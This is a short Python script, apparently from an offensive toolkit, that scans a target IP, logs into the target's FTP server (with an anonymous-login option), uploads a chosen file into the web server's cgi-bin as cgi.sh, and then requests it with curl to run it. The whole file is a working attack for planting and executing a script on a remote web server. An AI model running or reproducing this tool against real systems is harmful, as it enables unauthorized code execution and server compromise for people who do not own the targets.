import ftplib
import sys
import os

def checkVulnerable(targetIP):
    os.system(f"../../recon/portscanner/portscanner {targetIP} ~/Kiwi/data/scanfiles/webdrop")

def uploadFTPScript(targetIP, localFilename, remoteFilename, username, password):
    try:
        ftp = ftplib.FTP()
        ftp.connect(targetIP, 21)
        ftp.login(username, password)

        with open(localFilename, "rb") as localFile:
            ftp.storbinary(f'STOR {remoteFilename}', localFile)

        ftp.quit()
        print(f"[+] Uploaded {localFilename} to {remoteFilename}")

    except Exception as e:
        print(f"[-] FTP Upload Error: {e}")

def sendCurlRequest(fullURL):
    print(f"[+] Sending curl request to {fullURL}")
    os.system(f"curl http://{fullURL}")

if __name__ == "__main__":
    if len(sys.argv) == 3 and sys.argv[1] == "scan":
        targetIP = sys.argv[2]
        checkVulnerable(targetIP)

    elif len(sys.argv) == 5:
        targetIP = sys.argv[1]
        localFilename = sys.argv[2]
        username = sys.argv[3]
        password = sys.argv[4]

        if password == "::ANON::":
            password = "anonymous"

        uploadFTPScript(targetIP, localFilename, "/usr/lib/cgi-bin/cgi.sh", username, password)
        sendCurlRequest(f"{targetIP}/cgi-bin/cgi.sh")

    else:
        print("Usage:")
        print("  To scan: script.py scan <targetIP>")
        print("  To upload: script.py <targetIP> <localFile> <username> <password>")
